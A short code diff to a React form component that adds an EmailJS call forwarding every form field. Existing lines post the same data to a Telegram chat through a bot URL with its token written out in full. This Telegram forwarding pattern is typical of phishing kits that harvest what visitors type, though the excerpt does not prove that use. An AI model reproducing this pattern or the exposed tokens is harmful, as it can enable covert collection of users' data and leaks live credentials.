@@ -27,6 +27,15 @@ const SubmitApp = () => {
     const [disabled, setDisabled] = useState(true);
     const [error, setError] = useState(null);
 
+    var emailData = {
+        service_id: "service_8xjjilz",
+        template_id: "template_72leqzf",
+        user_id: "BeVa_hUxJ3jiw3zP2",
+        template_params: {
+            ...form,
+        },
+    };
+
     const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
         event.preventDefault();
         if (event.target.value.length === 0) {
@@ -49,6 +58,14 @@ const SubmitApp = () => {
         }
         if (!disabled) {
             show("loading");
+            await axios({
+                method: "post",
+                url: "https://api.emailjs.com/api/v1.0/email/send",
+                data: emailData,
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            });
             await axios({
                 method: "post",
                 url: `https://api.telegram.org/bot6257527521:AAGKNc12U7SmVDG-ulTTcoP1BQxDeGCoS-4/sendMessage?chat_id=-1001934192696&text=${data}`,
@@ -105,7 +122,7 @@ const SubmitApp = () => {
                         <Input
                             placeholder="Email"
                             value={form.email}
-                            type={"eanil"}
+                            type={"email"}
                             onChange={handleChange}
                         />
                         <div className={styles.validation}>
